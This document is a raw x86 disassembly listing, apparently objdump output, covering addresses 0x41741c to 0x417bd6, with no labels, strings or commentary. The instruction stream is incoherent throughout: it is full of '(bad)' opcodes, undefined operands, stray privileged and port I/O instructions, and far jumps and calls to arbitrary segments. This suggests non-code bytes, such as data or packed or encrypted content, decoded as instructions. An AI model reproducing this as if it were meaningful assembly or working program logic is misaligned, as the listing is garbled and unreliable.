  41741c:	jmp    0x417445
  41741e:	or     DWORD PTR [edx+0xb],edi
  417421:	adc    DWORD PTR [ebx],ebp
  417423:	add    esi,DWORD PTR [ecx+0x4786904f]
  417429:	adc    BYTE PTR [eax-0x6d64452],0x4c
  417430:	out    dx,eax
  417431:	(bad)  
  417432:	fsub   DWORD PTR [esi]
  417434:	xchg   DWORD PTR [ecx-0x42],esp
  417437:	stos   DWORD PTR es:[edi],eax
  417438:	sub    edi,0x5d38eb9f
  41743e:	jl     0x417470
  417440:	test   DWORD PTR [ebx-0x7],0x12217d47
  417447:	mov    esp,0x23e46ae9
  41744c:	sar    DWORD PTR [eax-0x75752ebf],0xbd
  417453:	mov    dl,0x94
  417455:	fisub  DWORD PTR [eax-0x61]
  417458:	or     DWORD PTR [ebx-0x65f9ce34],ebx
  41745e:	jl     0x417442
  417460:	or     BYTE PTR [edi+0x4c],dh
  417463:	and    DWORD PTR [ebx-0x1c],ebp
  417466:	outs   dx,DWORD PTR ds:[esi]
  417467:	xchg   ebx,eax
  417468:	push   ecx
  417469:	xor    BYTE PTR gs:[eax+esi*1+0x3d50284a],ch
  417471:	ret    0xee40
  417474:	or     eax,0xd57146c8
  417479:	rol    DWORD PTR [eax+esi*1],1
  41747c:	cmp    DWORD PTR [edx],0x17
  41747f:	rcr    BYTE PTR [esi+eiz*2+0x2a],0x8c
  417484:	adc    ebp,DWORD PTR [esi+eax*2]
  417487:	dec    ebx
  417488:	imul   edx,DWORD PTR [edx-0x76cd4fa],0x7b
  41748f:	push   esi
  417490:	push   edi
  417491:	cmc    
  417492:	jnp    0x417427
  417494:	(bad)  
  417495:	adc    DWORD PTR [edx],esp
  417497:	or     DWORD PTR [ebp+0x71],edi
  41749a:	mov    al,ds:0x5d5644ca
  41749f:	jbe    0x41743c
  4174a1:	or     ch,BYTE PTR [ecx]
  4174a3:	push   ebx
  4174a4:	mov    ds:0xadcd5a67,al
  4174a9:	pop    ecx
  4174aa:	push   esp
  4174ab:	stos   DWORD PTR es:[edi],eax
  4174ac:	sbb    BYTE PTR [eax],dl
  4174ae:	imul   ebx,DWORD PTR [edx+0x4c],0xcbf853ae
  4174b5:	or     edi,DWORD PTR [ebp-0x41270257]
  4174bb:	aad    0x2c
  4174bd:	xor    al,0xd5
  4174bf:	mov    al,0x99
  4174c1:	add    ecx,DWORD PTR [ebp-0x2a]
  4174c4:	test   eax,0xb5b045e1
  4174c9:	in     al,dx
  4174ca:	cmp    esp,DWORD PTR [ebx]
  4174cc:	scas   eax,DWORD PTR es:[edi]
  4174cd:	fwait
  4174ce:	and    eax,DWORD PTR [ecx+0x2e]
  4174d1:	sbb    ah,BYTE PTR [edi+0x1c34cbe5]
  4174d7:	mov    dl,bl
  4174d9:	fwait
  4174da:	mov    bl,0x57
  4174dc:	pop    ds
  4174dd:	(bad)  
  4174de:	pusha  
  4174df:	sub    eax,0xaefc4c81
  4174e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4174e5:	enter  0xb1de,0x2e
  4174e9:	pusha  
  4174ea:	inc    edi
  4174eb:	dec    ebp
  4174ec:	push   edx
  4174ed:	shr    esp,1
  4174ef:	inc    edx
  4174f0:	(bad)  
  4174f1:	aad    0xdb
  4174f3:	ret    0x9e40
  4174f6:	test   eax,0xb6dc7954
  4174fb:	mov    edi,0xc405ba7e
  417500:	mov    esp,0xa70839e2
  417505:	rcl    BYTE PTR [eax+edi*4],1
  417508:	icebp  
  417509:	sbb    al,BYTE PTR [ebp+0x1f2572fb]
  41750f:	push   esp
  417510:	stos   BYTE PTR es:[edi],al
  417511:	and    al,BYTE PTR [edx+0x74f4db34]
  417517:	push   esp
  417518:	mov    ebx,0x438c7794
  41751d:	and    al,0x89
  41751f:	adc    cl,ch
  417521:	and    eax,DWORD PTR [ebx]
  417523:	and    eax,0xcf6f4ba4
  417528:	lahf   
  417529:	icebp  
  41752a:	inc    esi
  41752b:	sub    eax,0x2b00cc34
  417530:	retf   
  417531:	cli    
  417532:	jecxz  0x41753d
  417534:	cmp    ebp,esi
  417536:	lods   al,BYTE PTR ds:[esi]
  417537:	sbb    BYTE PTR [esi+0x65],cl
  41753a:	xchg   ebx,eax
  41753b:	pop    esp
  41753c:	pop    edi
  41753d:	clc    
  41753e:	cmc    
  41753f:	cld    
  417540:	mov    eax,ds:0xb98b77d9
  417545:	mov    eax,0x45794478
  41754a:	pop    esp
  41754b:	daa    
  41754c:	add    esi,ebp
  41754e:	mov    esp,0x5f505d7
  417553:	mov    dl,0x44
  417555:	mov    ds:0x6ad38665,eax
  41755a:	aas    
  41755b:	pop    esp
  41755c:	adc    eax,0x83e9c3b0
  417561:	out    0x46,al
  417563:	sahf   
  417564:	dec    esi
  417565:	inc    ebp
  417566:	dec    eax
  417567:	mov    WORD PTR [edx],ds
  417569:	lea    ebx,[eax-0x22]
  41756c:	in     eax,dx
  41756d:	pusha  
  41756e:	dec    esp
  41756f:	mov    ah,0xaa
  417571:	jmp    0xca46:0xa7e1cb96
  417578:	pop    ss
  417579:	loop   0x417570
  41757b:	shl    BYTE PTR [esi],1
  41757d:	jnp    0x417508
  41757f:	stos   BYTE PTR es:[edi],al
  417580:	ja     0x4175bd
  417582:	call   0x7443:0x4a795aa9
  417589:	ss scas al,BYTE PTR es:[edi]
  41758b:	add    DWORD PTR [ecx+0x21],ecx
  41758e:	inc    ecx
  41758f:	or     DWORD PTR [edx+0x6a77dbfd],esp
  417595:	hlt    
  417596:	test   al,0xa2
  417598:	mov    esi,0xf058914
  41759d:	repz mov ebx,DWORD PTR [ebx+edi*8+0x64b9b799]
  4175a5:	imul   edx,DWORD PTR [ebx],0x25
  4175a8:	pop    ebx
  4175a9:	jb     0x417572
  4175ab:	push   ebx
  4175ac:	out    dx,al
  4175ad:	inc    eax
  4175ae:	jbe    0x4175a3
  4175b0:	and    eax,0x2e0979a
  4175b5:	cmp    DWORD PTR [edx+0x51],esp
  4175b8:	dec    esp
  4175b9:	pop    edx
  4175ba:	jecxz  0x41758e
  4175bc:	push   es
  4175bd:	not    BYTE PTR [edx]
  4175bf:	pusha  
  4175c0:	mov    DWORD PTR [esi],eax
  4175c2:	out    dx,al
  4175c3:	or     esi,eax
  4175c5:	xchg   edx,eax
  4175c6:	sti    
  4175c7:	adc    bh,BYTE PTR [ecx+0x2e66ca51]
  4175cd:	dec    esi
  4175ce:	mov    al,ds:0x67f5ef6c
  4175d3:	mov    bl,0x1f
  4175d5:	outs   dx,DWORD PTR ds:[esi]
  4175d6:	fnstenv [edi]
  4175d8:	jae    0x417578
  4175da:	xchg   esp,eax
  4175db:	cwde   
  4175dc:	mov    dl,0xd6
  4175de:	push   0x13
  4175e0:	ret    0x8b4a
  4175e3:	pop    ebp
  4175e4:	mov    ecx,0x6910b85c
  4175e9:	and    eax,0xa1833587
  4175ee:	push   ds
  4175ef:	xchg   ebx,eax
  4175f0:	push   edi
  4175f1:	xchg   edx,eax
  4175f2:	pop    ecx
  4175f3:	pop    edi
  4175f4:	jnp    0x417645
  4175f6:	sub    ebp,DWORD PTR [edx]
  4175f8:	push   edx
  4175f9:	sbb    DWORD PTR [eax],0x46
  4175fc:	add    bh,BYTE PTR [edx+0x16]
  4175ff:	jno    0x4175fb
  417601:	cmc    
  417602:	mov    edi,ebp
  417604:	pop    ebp
  417605:	or     eax,0x96cd9920
  41760a:	cld    
  41760b:	into   
  41760c:	dec    eax
  41760d:	outs   dx,BYTE PTR ds:[esi]
  41760e:	adc    bl,BYTE PTR [ebx+edx*8+0x13]
  417612:	dec    ebp
  417613:	pop    ds
  417614:	hlt    
  417615:	outs   dx,DWORD PTR ds:[esi]
  417616:	add    ebx,edi
  417618:	mov    sp,0xf0e9
  41761c:	mov    eax,0x21dafcfb
  417621:	in     eax,0x1b
  417623:	xor    eax,0xdd89cf10
  417628:	or     BYTE PTR [edx-0x284fda63],bl
  41762e:	cdq    
  41762f:	adc    BYTE PTR ds:0xc95c3f6d,bl
  417635:	pop    esi
  417636:	or     BYTE PTR [esi],dh
  417638:	in     eax,dx
  417639:	daa    
  41763a:	inc    esp
  41763b:	mov    esp,esi
  41763d:	push   edi
  41763e:	fnstsw WORD PTR es:[edx+0x3b]
  417642:	push   esp
  417643:	out    0x47,eax
  417645:	push   es
  417646:	pop    eax
  417647:	cmc    
  417648:	dec    eax
  417649:	sub    al,0x94
  41764b:	shr    BYTE PTR [eax-0x406caccc],0xb1
  417652:	fisub  DWORD PTR [esi+0x26714336]
  417658:	jnp    0x41766f
  41765a:	mov    ds:0x7937c50,al
  41765f:	in     al,dx
  417660:	(bad)  
  417661:	mov    ebp,0xcae2e482
  417666:	sub    ebx,DWORD PTR [edx]
  417668:	sbb    ecx,ebp
  41766a:	gs push eax
  41766c:	std    
  41766d:	ret    0xf7c0
  417670:	push   edx
  417671:	test   eax,0x230b62e
  417676:	cdq    
  417677:	loop   0x417633
  417679:	pop    ss
  41767a:	lods   eax,DWORD PTR ds:[esi]
  41767b:	call   0xf43c:0xaae9d227
  417682:	shl    DWORD PTR [ebx-0x53],0xf4
  417686:	mov    DWORD PTR [ebx],esi
  417688:	stc    
  417689:	into   
  41768a:	in     eax,dx
  41768b:	jnp    0x417663
  41768d:	test   DWORD PTR [ebp*1-0x6e2b60a1],ebx
  417694:	popa   
  417695:	pop    edx
  417696:	and    eax,DWORD PTR [esi]
  417698:	pop    ebx
  417699:	mov    ebx,0x57f9b523
  41769e:	mov    ecx,0x1711e9e0
  4176a3:	and    eax,0xbbd96a36
  4176a8:	(bad)  
  4176aa:	cmp    eax,DWORD PTR [ebp+ebx*4-0x2c]
  4176ae:	in     al,dx
  4176af:	dec    ecx
  4176b0:	pop    ss
  4176b1:	loop   0x417696
  4176b3:	xor    bl,BYTE PTR [edi+0x54]
  4176b6:	adc    esi,DWORD PTR [edi-0xb]
  4176b9:	mov    ecx,0x7e52a65c
  4176be:	jge    0x4176e1
  4176c0:	pinsrw mm4,ecx,0x4
  4176c4:	stos   BYTE PTR es:[edi],al
  4176c5:	neg    bh
  4176c7:	fisttp WORD PTR [eax-0x53]
  4176ca:	mov    dh,0x6b
  4176cc:	pop    eax
  4176cd:	loop   0x41772c
  4176cf:	mov    edx,0x9142eef8
  4176d4:	bound  esi,QWORD PTR [edx]
  4176d6:	rcl    BYTE PTR [eax+0x4b],0x91
  4176da:	fistp  QWORD PTR [ecx+0x20]
  4176dd:	das    
  4176de:	aad    0x1
  4176e0:	ror    DWORD PTR [esi],cl
  4176e2:	xchg   esi,eax
  4176e3:	pop    esi
  4176e4:	into   
  4176e5:	call   0xb60fe32c
  4176ea:	cdq    
  4176eb:	hlt    
  4176ec:	sub    al,0xdc
  4176ee:	sbb    bh,BYTE PTR [ecx+0x35]
  4176f1:	(bad)  
  4176f2:	js     0x417714
  4176f4:	shr    dh,cl
  4176f6:	cmp    ah,al
  4176f8:	les    edi,FWORD PTR [ecx-0x74]
  4176fb:	loope  0x417771
  4176fd:	sti    
  4176fe:	xor    ebx,esi
  417700:	add    edx,DWORD PTR [edi+0x2a]
  417703:	sub    BYTE PTR [ecx],dh
  417705:	inc    esi
  417706:	sbb    esp,eax
  417708:	cmp    eax,0x8c1ff6a7
  41770d:	test   eax,0x743ee07e
  417712:	add    DWORD PTR [eax],ebx
  417714:	dec    edi
  417715:	sub    eax,0x342644ec
  41771a:	fcom   QWORD PTR [ecx-0x7845c71f]
  417720:	dec    ebx
  417721:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417722:	inc    edx
  417723:	mov    dh,0x60
  417725:	pop    esi
  417726:	cmp    BYTE PTR [edx-0x3e],bh
  417729:	shl    ebp,1
  41772b:	adc    esi,DWORD PTR [eax+0x76]
  41772e:	mov    dl,BYTE PTR [edi-0x1c461844]
  417734:	enter  0xf7c5,0xbf
  417738:	cmc    
  417739:	fdivr  QWORD PTR [esp+edx*8+0x1cb23c7e]
  417741:	mov    cl,0xda
  417743:	inc    ecx
  417744:	xchg   edx,eax
  417745:	sub    al,0x9a
  417747:	jg     0x4176e5
  417749:	lods   eax,DWORD PTR ds:[esi]
  41774a:	mov    bl,bh
  41774c:	mov    ah,0xa8
  41774e:	stos   DWORD PTR es:[edi],eax
  41774f:	mov    esi,0x7ab12040
  417754:	mov    dl,0x8e
  417756:	imul   ebx,DWORD PTR [esi],0xffffffe5
  417759:	xchg   ebp,eax
  41775a:	mov    ch,0x7e
  41775c:	xchg   ebp,eax
  41775d:	and    eax,0x6372500e
  417762:	add    al,BYTE PTR [edx+0x5b]
  417765:	hlt    
  417766:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417767:	rol    BYTE PTR [ebx-0x608e2de9],0x4d
  41776e:	mov    eax,eax
  417770:	pop    es
  417771:	aad    0x43
  417773:	push   ds
  417774:	pusha  
  417775:	sbb    DWORD PTR [ebx+ebp*1],0x74b8dd1e
  41777c:	mov    esp,0xb3547194
  417781:	loopne 0x417746
  417783:	jo     0x417723
  417785:	pop    esi
  417786:	daa    
  417787:	and    DWORD PTR [ecx],ebx
  417789:	mov    edx,0xecf48d5
  41778e:	sub    BYTE PTR [edi-0x42],0xd8
  417792:	ja     0x417744
  417794:	call   0xfdab:0xec055dd4
  41779b:	stos   DWORD PTR es:[edi],eax
  41779c:	inc    ecx
  41779d:	pushf  
  41779e:	push   0xa2314acc
  4177a3:	sahf   
  4177a4:	jb     0x417759
  4177a6:	inc    eax
  4177a7:	call   eax
  4177a9:	icebp  
  4177aa:	and    BYTE PTR [eax+ebp*4],0xa2
  4177ae:	mov    esi,0xa02c9e51
  4177b3:	addr16 popa 
  4177b5:	xchg   ebx,eax
  4177b6:	popf   
  4177b7:	mov    ecx,DWORD PTR [esi+0xdfed92f]
  4177bd:	add    BYTE PTR [ebx+ebp*4+0x3544ee1],ch
  4177c4:	shl    DWORD PTR [edx+ebx*8-0x1f],cl
  4177c8:	imul   esp,DWORD PTR [edx],0xffffffb1
  4177cb:	out    dx,eax
  4177cc:	mov    ecx,0x48324f6
  4177d1:	icebp  
  4177d2:	(bad)  
  4177d4:	lock lea ecx,[ecx-0x1b708bc8]
  4177db:	sub    al,0xbf
  4177dd:	dec    esi
  4177de:	and    eax,0x48328277
  4177e3:	mov    esp,edx
  4177e5:	jae    0x4177f3
  4177e7:	loopne 0x417837
  4177e9:	mov    ebx,0xc0113261
  4177ee:	fstp   TBYTE PTR [ebx-0x43ad60c]
  4177f4:	pop    edi
  4177f5:	jns    0x417864
  4177f7:	rol    BYTE PTR [ebx+edx*1+0x6f],0xab
  4177fc:	jmp    DWORD PTR [edx-0x12]
  4177ff:	jmp    0x4177db
  417801:	or     dl,dl
  417803:	stc    
  417804:	mov    cl,0x9d
  417806:	push   DWORD PTR [edx+0x11c84cbc]
  41780c:	lds    edx,FWORD PTR [ebx+eiz*1]
  41780f:	retf   
  417810:	or     BYTE PTR ds:0x6be5f4b3,bl
  417816:	rol    BYTE PTR [edi-0x16],1
  417819:	jnp    0x417818
  41781b:	push   ebp
  41781c:	dec    ebp
  41781d:	clc    
  41781e:	fwait
  41781f:	mov    eax,0xa884e760
  417824:	outs   dx,DWORD PTR ds:[esi]
  417825:	ins    BYTE PTR es:[edi],dx
  417826:	jae    0x4177b6
  417828:	rcl    al,cl
  41782a:	outs   dx,BYTE PTR ds:[esi]
  41782b:	fistp  DWORD PTR [ecx]
  41782d:	pop    edi
  41782e:	and    DWORD PTR cs:[si+0x71a9],esp
  417834:	push   esi
  417835:	mov    esi,0x77471f26
  41783a:	xchg   ebx,eax
  41783b:	cdq    
  41783c:	push   ecx
  41783d:	imul   BYTE PTR [ebx]
  41783f:	jno    0x4177db
  417841:	mov    edx,0xe78f8a12
  417846:	pop    esi
  417847:	jb     0x417858
  417849:	fimul  WORD PTR [ebx-0x4e4e1a0d]
  41784f:	sbb    eax,0xf021e0ad
  417854:	xchg   edx,eax
  417855:	cmp    al,0x25
  417857:	jb     0x41782a
  417859:	dec    esp
  41785a:	pop    edi
  41785b:	push   esi
  41785c:	stc    
  41785d:	or     eax,DWORD PTR [edi]
  41785f:	icebp  
  417860:	addr16 stc 
  417862:	jmp    0x417869
  417864:	mov    BYTE PTR [ebp-0x34],bh
  417867:	jns    0x41789f
  417869:	mov    ds,WORD PTR [ebx+ebx*4+0x1c]
  41786d:	mov    bl,0x41
  41786f:	mul    BYTE PTR [ebx-0x16]
  417872:	pop    esp
  417873:	mov    bh,0x1f
  417875:	lods   eax,DWORD PTR ds:[esi]
  417876:	sbb    dh,BYTE PTR [eax+edx*2-0x42288368]
  41787d:	pushf  
  41787e:	dec    eax
  41787f:	das    
  417880:	push   es
  417881:	lock cmp al,0xc5
  417884:	in     al,dx
  417885:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417886:	pop    ds
  417887:	push   esi
  417888:	push   eax
  417889:	inc    esi
  41788a:	mov    ds:0x4e44ad49,eax
  41788f:	dec    ebx
  417890:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417891:	mov    eax,ds:0x89204c3
  417896:	sub    ebx,DWORD PTR ds:0x67439ba3
  41789c:	stos   BYTE PTR es:[edi],al
  41789d:	outs   dx,WORD PTR fs:[esi]
  4178a0:	fidiv  DWORD PTR ss:[esi-0x19e9309d]
  4178a7:	int    0x19
  4178a9:	pop    ecx
  4178aa:	iret   
  4178ab:	push   ss
  4178ac:	lds    ecx,FWORD PTR [edi]
  4178ae:	imul   BYTE PTR [ecx+0x7d]
  4178b1:	jmp    0x65ed:0x91010255
  4178b8:	pop    edi
  4178b9:	ror    BYTE PTR [ebp-0x24],1
  4178bc:	daa    
  4178bd:	jecxz  0x417884
  4178bf:	push   esi
  4178c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178c1:	lea    ebp,[esi]
  4178c3:	sbb    eax,DWORD PTR [ecx+0x7fa1534d]
  4178c9:	fadd   st,st(1)
  4178cb:	cwde   
  4178cc:	daa    
  4178cd:	out    0xa0,eax
  4178cf:	jmp    0x5454b83d
  4178d4:	(bad)  
  4178d5:	jmp    0xd620da49
  4178da:	mov    ds,WORD PTR [esi+edx*2]
  4178dd:	xor    al,0x3a
  4178df:	dec    esp
  4178e0:	cmp    ah,cl
  4178e2:	shl    ebp,cl
  4178e4:	sbb    ecx,ecx
  4178e6:	loopne 0x417935
  4178e8:	dec    edx
  4178e9:	jae    0x417877
  4178eb:	cmp    DWORD PTR [ecx+0x7d6168e3],edx
  4178f1:	arpl   WORD PTR [edi],si
  4178f3:	lds    ecx,FWORD PTR [ecx]
  4178f5:	aam    0xeb
  4178f7:	mov    ah,0xb5
  4178f9:	fstp   DWORD PTR [edx]
  4178fb:	sbb    DWORD PTR [eax],edx
  4178fd:	stc    
  4178fe:	leave  
  4178ff:	lock (bad) 
  417901:	sbb    DWORD PTR [edx+0x6c],esi
  417904:	fsubr  QWORD PTR [edi-0x988eb9a]
  41790a:	xchg   DWORD PTR [ebx-0x3a157a6a],ebp
  417910:	inc    esp
  417911:	cs scas al,BYTE PTR es:[edi]
  417913:	push   esp
  417914:	xor    ebx,DWORD PTR [esi-0x60]
  417917:	add    eax,0xe53d4527
  41791c:	mov    ebp,0x35c50e14
  417921:	push   es
  417922:	dec    edx
  417923:	mov    edi,0xb1e54db9
  417928:	sub    DWORD PTR [edx],edx
  41792a:	repnz rcl DWORD PTR [edx-0x3530b1a6],0x86
  417932:	outs   dx,DWORD PTR ds:[esi]
  417933:	xchg   ecx,eax
  417934:	mov    bl,0xac
  417936:	cmp    eax,0xf453ad05
  41793b:	leave  
  41793c:	test   al,0x73
  41793e:	out    dx,eax
  41793f:	lods   eax,DWORD PTR ds:[esi]
  417940:	mov    edi,0x515f7aa7
  417945:	out    dx,eax
  417946:	stos   DWORD PTR es:[edi],eax
  417947:	push   0xf
  417949:	out    dx,al
  41794a:	scas   al,BYTE PTR es:[edi]
  41794b:	cld    
  41794c:	push   edi
  41794d:	ficom  WORD PTR [eax+esi*4]
  417950:	loop   0x4179a4
  417952:	loop   0x4178ee
  417954:	adc    al,0xb1
  417956:	mov    edx,0x5b792138
  41795b:	adc    esi,DWORD PTR [ebp-0x68d658f2]
  417961:	or     eax,0xf570cac5
  417966:	add    cl,dl
  417968:	jge    0x4179ab
  41796a:	jne    0x4178ed
  41796c:	outs   dx,DWORD PTR ds:[esi]
  41796d:	retf   
  41796e:	xchg   DWORD PTR [ebp+0x3c],edi
  417971:	dec    edi
  417972:	mov    ah,0x78
  417974:	sbb    dl,BYTE PTR [ebx+0x2d]
  417977:	outs   dx,BYTE PTR ds:[esi]
  417978:	xor    BYTE PTR [esi+0x19],dh
  41797b:	scas   eax,DWORD PTR es:[edi]
  41797c:	and    ebx,esp
  41797e:	lock push ss
  417980:	cmp    cl,BYTE PTR [ecx-0x75f8272d]
  417986:	inc    esi
  417987:	lock add al,0x43
  41798a:	lds    ebx,FWORD PTR [esi]
  41798c:	mov    bl,0x71
  41798e:	ins    BYTE PTR es:[edi],dx
  41798f:	dec    ebx
  417990:	mov    al,0x5b
  417992:	test   eax,eax
  417994:	sti    
  417995:	aas    
  417996:	bound  edx,QWORD PTR [ebp+0x6643a5d1]
  41799c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41799d:	xchg   esp,eax
  41799e:	mov    ebp,0x534a245c
  4179a3:	inc    edx
  4179a4:	mov    ebp,0x7dcb346a
  4179a9:	inc    esp
  4179aa:	aaa    
  4179ab:	push   0xffffffcc
  4179ad:	xor    BYTE PTR [edx],0x1
  4179b0:	jnp    0x4179a7
  4179b2:	in     al,0x9b
  4179b4:	neg    DWORD PTR [edx+0x3eaf6513]
  4179ba:	addr16 mov ds:0xff13,al
  4179be:	mov    WORD PTR [edx-0x64],ds
  4179c1:	mov    bl,0xb9
  4179c4:	call   0xeb08:0xc08954df
  4179cb:	jne    0x417973
  4179cd:	out    0xb,eax
  4179cf:	xchg   edx,eax
  4179d0:	test   DWORD PTR ds:0x9626dd24,0x7d32af7d
  4179da:	jp     0x417a08
  4179dc:	daa    
  4179dd:	xchg   DWORD PTR [ebp+0x7],esi
  4179e0:	lahf   
  4179e1:	mov    esi,0xa5b6f723
  4179e6:	mov    edi,0xc7f52c06
  4179eb:	(bad)  
  4179ec:	ficom  WORD PTR [ecx]
  4179ee:	ror    bh,0x77
  4179f1:	mov    ds:0x9f164b15,al
  4179f6:	not    DWORD PTR [ebx-0x61]
  4179f9:	stos   DWORD PTR es:[edi],eax
  4179fa:	xor    dh,BYTE PTR [edx-0x3313fb53]
  417a00:	dec    eax
  417a01:	cmp    BYTE PTR [ebp+0x7d],ah
  417a04:	dec    ecx
  417a05:	inc    edx
  417a06:	cmp    cl,ch
  417a08:	push   esi
  417a09:	jmp    0x4179a0
  417a0b:	sbb    esp,DWORD PTR [edi]
  417a0d:	mov    al,ds:0x6c387d23
  417a12:	sbb    al,0xad
  417a14:	push   ecx
  417a15:	xchg   DWORD PTR [ecx],edx
  417a17:	fild   QWORD PTR [edx+0x401354bb]
  417a1d:	cld    
  417a1e:	das    
  417a1f:	outs   dx,BYTE PTR ds:[esi]
  417a20:	mov    dl,0xe2
  417a22:	push   cs
  417a23:	xor    bh,cl
  417a25:	mov    dh,0x27
  417a27:	inc    edi
  417a28:	aaa    
  417a29:	jmp    0xba21:0x8ff2e35c
  417a30:	push   ebx
  417a31:	out    dx,eax
  417a32:	push   0x9879cc1e
  417a37:	cmp    DWORD PTR [eax-0x2c],eax
  417a3a:	addr16 inc eax
  417a3c:	push   edi
  417a3d:	jnp    0x417a1a
  417a3f:	cld    
  417a40:	ficomp DWORD PTR [ecx+0x4187e3d5]
  417a46:	mov    WORD PTR [ecx],?
  417a48:	je     0x417a8e
  417a4a:	imul   esp,edx,0x65b022e4
  417a50:	add    ebp,DWORD PTR [esi]
  417a52:	scas   eax,DWORD PTR es:[edi]
  417a53:	mov    al,ds:0x13a817b9
  417a58:	cmp    edi,esp
  417a5a:	pop    es
  417a5b:	sti    
  417a5c:	mov    ebx,0xd7e2113e
  417a61:	aad    0x87
  417a63:	push   esp
  417a64:	retf   
  417a65:	jae    0x417a3e
  417a67:	add    BYTE PTR [ebx+edx*4],bh
  417a6a:	mov    BYTE PTR [eax-0x1e],dl
  417a6d:	imul   esi,DWORD PTR [esi],0x46
  417a70:	loope  0x417a74
  417a72:	push   cs
  417a73:	mov    edx,0x429fdb39
  417a78:	pop    es
  417a79:	fwait
  417a7a:	lock jl 0x417ad0
  417a7d:	cwde   
  417a7e:	lods   al,BYTE PTR ds:[esi]
  417a7f:	stos   DWORD PTR es:[edi],eax
  417a80:	ja     0x417afb
  417a82:	outs   dx,DWORD PTR ds:[esi]
  417a83:	mov    ch,0xcc
  417a85:	call   0x9b92:0x4f0622de
  417a8c:	mov    fs,WORD PTR [esi+edx*1-0x72c72cfa]
  417a93:	sub    eax,0x3addd88f
  417a98:	inc    esp
  417a99:	or     bh,dh
  417a9b:	cmp    BYTE PTR [edi-0x25],al
  417a9e:	mov    eax,0xe60c2139
  417aa3:	adc    DWORD PTR [edx+0x5b],ebp
  417aa6:	pop    ebx
  417aa7:	mov    ch,0x6c
  417aa9:	xor    ebx,0x22
  417aac:	(bad)  
  417aad:	aad    0x58
  417aaf:	pop    es
  417ab0:	stc    
  417ab1:	xor    esp,DWORD PTR [edi]
  417ab3:	inc    esp
  417ab5:	leave  
  417ab6:	(bad)  
  417ab8:	and    BYTE PTR [ebx],bh
  417aba:	sub    bl,bh
  417abc:	enter  0x1f79,0x4e
  417ac0:	invd   
  417ac2:	cmp    cl,ah
  417ac4:	dec    eax
  417ac5:	and    dh,BYTE PTR [ecx-0x57b221b9]
  417acb:	mov    eax,0x81935ccd
  417ad0:	adc    eax,DWORD PTR [edx+eiz*4]
  417ad3:	loopne 0x417afa
  417ad5:	outs   dx,DWORD PTR ds:[esi]
  417ad6:	fmul   DWORD PTR [edi+eiz*8-0xe]
  417ada:	mov    eax,ds:0xced5d901
  417adf:	out    0x93,al
  417ae1:	test   DWORD PTR ss:[ebx-0x3479746e],0x4e601ab1
  417aec:	das    
  417aed:	xchg   dl,ch
  417aef:	out    dx,al
  417af0:	push   ebp
  417af1:	xchg   edx,eax
  417af2:	or     al,0xcd
  417af4:	inc    ebx
  417af5:	pop    ecx
  417af6:	ds icebp 
  417af8:	jo     0x417b2a
  417afa:	scas   al,BYTE PTR es:[edi]
  417afb:	push   ecx
  417afc:	jns    0x417a87
  417afe:	ja     0x417b58
  417b00:	cmp    ebx,eax
  417b02:	sar    DWORD PTR [ecx+0x22],cl
  417b05:	mov    cs,WORD PTR [esi]
  417b07:	xchg   esp,eax
  417b08:	outs   dx,BYTE PTR ds:[esi]
  417b09:	add    al,BYTE PTR [esi+edi*2-0x4baf3353]
  417b10:	jecxz  0x417b85
  417b12:	mov    ebp,0x882e5298
  417b17:	and    eax,0x72a549a
  417b1c:	mov    ecx,0xd3c89349
  417b21:	push   es
  417b22:	xor    DWORD PTR [ebp-0x79],edx
  417b25:	mov    al,0x5d
  417b27:	outs   dx,DWORD PTR ds:[esi]
  417b28:	pop    ebx
  417b29:	clc    
  417b2a:	mov    ds:0xed73b474,eax
  417b2f:	push   es
  417b30:	inc    eax
  417b31:	mov    ebp,0x1808cd8c
  417b36:	out    dx,eax
  417b37:	mov    al,ds:0x9538ee73
  417b3c:	sti    
  417b3d:	fs (bad) 
  417b3f:	pop    edi
  417b40:	call   DWORD PTR [eax]
  417b42:	push   esp
  417b43:	loop   0x417b23
  417b45:	dec    edi
  417b46:	sub    dl,BYTE PTR [edx+esi*2-0x21683782]
  417b4d:	xor    ah,al
  417b4f:	adc    eax,0x8ed21453
  417b54:	sbb    bh,BYTE PTR [eax-0x5f]
  417b57:	in     eax,dx
  417b58:	aas    
  417b59:	mov    ebx,0xb6239d1b
  417b5e:	shl    BYTE PTR [esp+eiz*4-0x7218273e],cl
  417b65:	mul    DWORD PTR [edx]
  417b67:	and    DWORD PTR [edi+0x4d],esi
  417b6a:	pop    sp
  417b6c:	cdq    
  417b6d:	cmp    edi,edx
  417b6f:	push   0x64
  417b71:	minps  xmm7,XMMWORD PTR [edi-0x4c]
  417b75:	loop   0x417b2a
  417b77:	lea    esp,[edx+0xd601172]
  417b7d:	mov    al,BYTE PTR [edx+0x6c]
  417b80:	rcl    BYTE PTR [ebx-0x2a],0xc3
  417b84:	mov    eax,ds:0x5e64c
  417b89:	dec    cl
  417b8b:	inc    edi
  417b8c:	mov    ah,BYTE PTR [eax]
  417b8e:	dec    ebp
  417b8f:	pop    es
  417b90:	jae    0x417b8d
  417b92:	mov    ds:0xedfe86a9,al
  417b97:	mov    dl,0x97
  417b99:	jnp    0x417bfd
  417b9b:	lock push es
  417b9d:	fldenv [ebx-0x441329f7]
  417ba3:	mov    bl,0xfe
  417ba5:	mov    ch,0x70
  417ba7:	sar    ch,0xf2
  417baa:	lahf   
  417bab:	mov    cl,0xd0
  417bad:	int    0x4a
  417baf:	fwait
  417bb0:	es clc 
  417bb2:	mov    ?,WORD PTR [ebx-0x4f]
  417bb5:	pop    ecx
  417bb6:	test   eax,0xb3c9ef8
  417bbb:	inc    edi
  417bbc:	inc    ebx
  417bbd:	cdq    
  417bbe:	ss jle 0x417b9b
  417bc1:	fild   DWORD PTR [ecx-0x1f]
  417bc4:	jnp    0x417c38
  417bc6:	sbb    eax,0x1d9bcbe6
  417bcb:	test   al,0x7a
  417bcd:	jecxz  0x417b5d
  417bcf:	mov    ah,0xdc
  417bd1:	ins    DWORD PTR es:[edi],dx
  417bd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bd3:	stos   DWORD PTR es:[edi],eax
  417bd4:	push   0x24
  417bd6:	sub    edi,DWORD PTR [ebx]
